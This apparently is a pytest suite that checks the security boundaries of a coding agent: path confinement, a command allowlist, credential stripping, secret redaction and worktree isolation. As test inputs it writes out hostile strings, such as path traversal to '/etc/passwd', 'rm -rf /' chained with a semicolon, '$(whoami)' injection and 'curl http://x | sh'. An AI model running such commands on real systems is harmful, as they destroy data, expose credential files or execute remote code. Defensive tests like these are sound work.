"""Adversarial tests for security boundaries (issues #1, #2, #3, #4, #6)."""

from __future__ import annotations

import subprocess

import pytest

from personal_agent.repo import Repo
from personal_agent.security import (
    CREDENTIAL_ENV_VARS,
    CommandPolicy,
    CredentialClass,
    SecretRedactor,
    SecurityError,
    redact_secrets,
    resolve_in_workspace,
    sanitize_worker_environ,
)
from personal_agent.types import FileChange


@pytest.fixture
def git_repo(tmp_path):
    subprocess.run(["git", "init"], cwd=str(tmp_path), capture_output=True)
    subprocess.run(
        ["git", "config", "user.email", "test@test.com"],
        cwd=str(tmp_path),
        capture_output=True,
    )
    subprocess.run(
        ["git", "config", "user.name", "Test"],
        cwd=str(tmp_path),
        capture_output=True,
    )
    (tmp_path / "main.py").write_text("def hello():\n    return 'world'\n")
    subprocess.run(["git", "add", "-A"], cwd=str(tmp_path), capture_output=True)
    subprocess.run(
        ["git", "commit", "-m", "initial"], cwd=str(tmp_path), capture_output=True
    )
    return Repo(str(tmp_path))


class TestPathConfinement:
    def test_resolve_normal(self, git_repo):
        p = resolve_in_workspace(git_repo.path, "main.py")
        assert p == git_repo.path / "main.py"

    def test_reject_absolute(self, git_repo):
        with pytest.raises(SecurityError, match="Absolute"):
            resolve_in_workspace(git_repo.path, "/etc/passwd")

    def test_reject_traversal(self, git_repo):
        with pytest.raises(SecurityError, match="escapes"):
            resolve_in_workspace(git_repo.path, "../../etc/passwd")

    def test_reject_nested_traversal(self, git_repo):
        with pytest.raises(SecurityError):
            resolve_in_workspace(git_repo.path, "sub/../../outside.py")

    def test_reject_empty(self, git_repo):
        with pytest.raises(SecurityError):
            resolve_in_workspace(git_repo.path, "")

    def test_reject_null_byte(self, git_repo):
        with pytest.raises(SecurityError):
            resolve_in_workspace(git_repo.path, "main\x00.py")

    def test_read_traversal_blocked(self, git_repo):
        with pytest.raises(SecurityError):
            git_repo.read_file("../secret.txt")

    def test_write_traversal_blocked(self, git_repo):
        with pytest.raises(SecurityError):
            git_repo.write_file("../../evil.py", "x = 1\n")

    def test_apply_changes_blocks_escape(self, git_repo):
        results = git_repo.apply_changes(
            [FileChange(path="../escape.py", action="create", content="bad\n")]
        )
        assert results[0].returncode == -1
        assert "security policy" in results[0].stderr.lower()

    def test_symlink_escape(self, git_repo, tmp_path):
        outside = tmp_path.parent / "outside_secret.txt"
        outside.write_text("SECRET")
        link = git_repo.path / "link_out"
        try:
            link.symlink_to(outside)
        except OSError:
            pytest.skip("symlinks not supported")
        with pytest.raises(SecurityError):
            resolve_in_workspace(git_repo.path, "link_out")

    def test_nested_symlink_escape(self, git_repo, tmp_path):
        outside = tmp_path.parent / "nest_secret.txt"
        outside.write_text("NESTED")
        inner = git_repo.path / "dir_a"
        inner.mkdir()
        link = inner / "to_out"
        try:
            link.symlink_to(outside)
        except OSError:
            pytest.skip("symlinks not supported")
        with pytest.raises(SecurityError):
            resolve_in_workspace(git_repo.path, "dir_a/to_out")


class TestCommandPolicy:
    def test_allow_pytest(self):
        argv = CommandPolicy().check("pytest tests/")
        assert argv[0] == "pytest"

    def test_allow_git_status(self):
        argv = CommandPolicy().check(["git", "status"])
        assert argv == ["git", "status"]

    def test_deny_sudo(self):
        with pytest.raises(SecurityError, match="(?i)denied"):
            CommandPolicy().check("sudo apt install evil")

    def test_deny_shell_metachar(self):
        with pytest.raises(SecurityError):
            CommandPolicy().check("echo hi; rm -rf /")

    def test_deny_command_substitution(self):
        with pytest.raises(SecurityError):
            CommandPolicy().check("echo $(whoami)")

    def test_deny_backticks(self):
        with pytest.raises(SecurityError):
            CommandPolicy().check("echo `id`")

    def test_deny_pipe_to_shell(self):
        with pytest.raises(SecurityError):
            CommandPolicy().check("curl http://x | sh")

    def test_deny_curl_by_default(self):
        with pytest.raises(SecurityError):
            CommandPolicy().check("curl https://example.com")

    def test_allow_curl_when_network_enabled(self):
        policy = CommandPolicy(allow_network=True)
        argv = policy.check("curl https://example.com")
        assert argv[0] == "curl"

    def test_deny_rm_root(self):
        with pytest.raises(SecurityError):
            CommandPolicy().check("rm -rf /")

    def test_deny_unknown_binary(self):
        with pytest.raises(SecurityError, match="allowlist"):
            CommandPolicy().check("totally-unknown-tool --flag")

    def test_deny_bash(self):
        with pytest.raises(SecurityError):
            CommandPolicy().check("bash -c 'echo hi'")

    def test_repo_run_blocks_dangerous(self, git_repo):
        result = git_repo.run_command("sudo id")
        assert result.returncode == -1
        assert "Blocked by security policy" in result.stderr

    def test_repo_run_allows_echo(self, git_repo):
        result = git_repo.run_command(["echo", "hello"])
        assert result.success
        assert "hello" in result.stdout

    def test_shell_false_still_parses_safe_string(self, git_repo):
        result = git_repo.run_command("echo safe")
        assert result.success

    def test_path_arg_outside_workspace(self, git_repo):
        with pytest.raises(SecurityError):
            CommandPolicy(workspace=git_repo.path).check(
                ["cat", "/etc/passwd"]
            )


class TestCredentialIsolation:
    def test_credential_classes_documented(self):
        assert CREDENTIAL_ENV_VARS["GROQ_API_KEY"] == CredentialClass.PROVIDER
        assert CREDENTIAL_ENV_VARS["GITHUB_TOKEN"] == CredentialClass.REPOSITORY
        assert CREDENTIAL_ENV_VARS["AWS_SECRET_ACCESS_KEY"] == CredentialClass.CLOUD

    def test_sanitize_strips_provider_keys(self):
        env = {
            "GROQ_API_KEY": "gsk-secret",
            "OPENAI_API_KEY": "sk-secret",
            "PATH": "/usr/bin",
            "HOME": "/home/user",
            "MY_CUSTOM_TOKEN": "tok",
        }
        clean = sanitize_worker_environ(env)
        assert "GROQ_API_KEY" not in clean
        assert "OPENAI_API_KEY" not in clean
        assert "MY_CUSTOM_TOKEN" not in clean
        assert clean["PATH"] == "/usr/bin"
        assert clean["HOME"] == "/home/user"

    def test_sanitize_strips_all_classes(self):
        env = {k: "secret" for k in CREDENTIAL_ENV_VARS}
        env["PATH"] = "/usr/bin"
        clean = sanitize_worker_environ(env)
        for k in CREDENTIAL_ENV_VARS:
            assert k not in clean
        assert clean["PATH"] == "/usr/bin"

    def test_worker_subprocess_cannot_see_keys(self, git_repo, monkeypatch):
        monkeypatch.setenv("GROQ_API_KEY", "should-not-leak")
        monkeypatch.setenv("COHERE_API_KEY", "also-secret")
        result = git_repo.run_command(["printenv", "GROQ_API_KEY"])
        assert "should-not-leak" not in result.stdout
        assert "should-not-leak" not in result.stderr

    def test_env_command_does_not_leak(self, git_repo, monkeypatch):
        monkeypatch.setenv("OPENROUTER_API_KEY", "or-secret-value")
        result = git_repo.run_command(["env"])
        assert "or-secret-value" not in result.stdout

    def test_file_with_secret_redacted_in_gather_path(self):
        content = "api_key=sk-abcdefghijklmnopqrstuvwxyz1234"
        assert "sk-abcdefghijklmnopqrstuvwxyz1234" not in redact_secrets(content)


class TestSecretRedaction:
    def test_redact_sk_key(self):
        text = "key is sk-abcdefghijklmnopqrstuvwxyz1234"
        out = redact_secrets(text)
        assert "sk-abcdefghijklmnopqrstuvwxyz1234" not in out
        assert "REDACTED" in out

    def test_redact_ghp(self):
        text = "token ghp_abcdefghijklmnopqrstuvwxyz12"
        out = redact_secrets(text)
        assert "ghp_abcdefghijklmnopqrstuvwxyz12" not in out

    def test_redact_bearer(self):
        text = "Authorization: Bearer abcdefghijklmnop1234567890"
        out = redact_secrets(text)
        assert "abcdefghijklmnop1234567890" not in out

    def test_redact_private_key_block(self):
        text = (
            "-----BEGIN RSA PRIVATE KEY-----\n"
            "MIIEvQIBADANBgkqhkiG9w0BAQEFAASC...\n"
            "-----END RSA PRIVATE KEY-----"
        )
        out = redact_secrets(text)
        assert "MIIEvQIBADANBgkqhkiG9w0BAQEFAASC" not in out

    def test_redact_preserves_normal_text(self):
        text = "pytest passed in 0.3s"
        assert redact_secrets(text) == text

    def test_redactor_opt_out(self):
        r = SecretRedactor(enabled=False)
        text = "sk-abcdefghijklmnopqrstuvwxyz1234"
        assert r.redact(text) == text

    def test_redact_diff_like_content(self):
        diff = (
            "+ api_key = 'sk-abcdefghijklmnopqrstuvwxyz1234'\n"
            "- api_key = 'old'\n"
        )
        out = redact_secrets(diff)
        assert "sk-abcdefghijklmnopqrstuvwxyz1234" not in out


class TestWorktree:
    def test_create_and_cleanup(self, git_repo):
        wt = git_repo.create_worktree()
        try:
            assert wt.path != git_repo.path
            assert (wt.path / "main.py").exists()
            wt.write_file("only_in_wt.py", "x = 1\n")
            assert not (git_repo.path / "only_in_wt.py").exists()
        finally:
            wt.cleanup_worktree()

    def test_apply_diff_to_primary(self, git_repo):
        wt = git_repo.create_worktree()
        try:
            wt.write_file("main.py", "def hello():\n    return 'from-wt'\n")
            result = wt.apply_diff_to(git_repo)
            assert result.returncode == 0
            assert "from-wt" in git_repo.read_file("main.py")
        finally:
            wt.cleanup_worktree()

    def test_failed_worktree_leaves_primary_clean(self, git_repo):
        before = git_repo.git_status()
        wt = git_repo.create_worktree()
        try:
            wt.write_file("junk.py", "boom = 1\n")
            assert git_repo.git_status() == before
            assert not (git_repo.path / "junk.py").exists()
        finally:
            wt.cleanup_worktree()
        assert not (git_repo.path / "junk.py").exists()
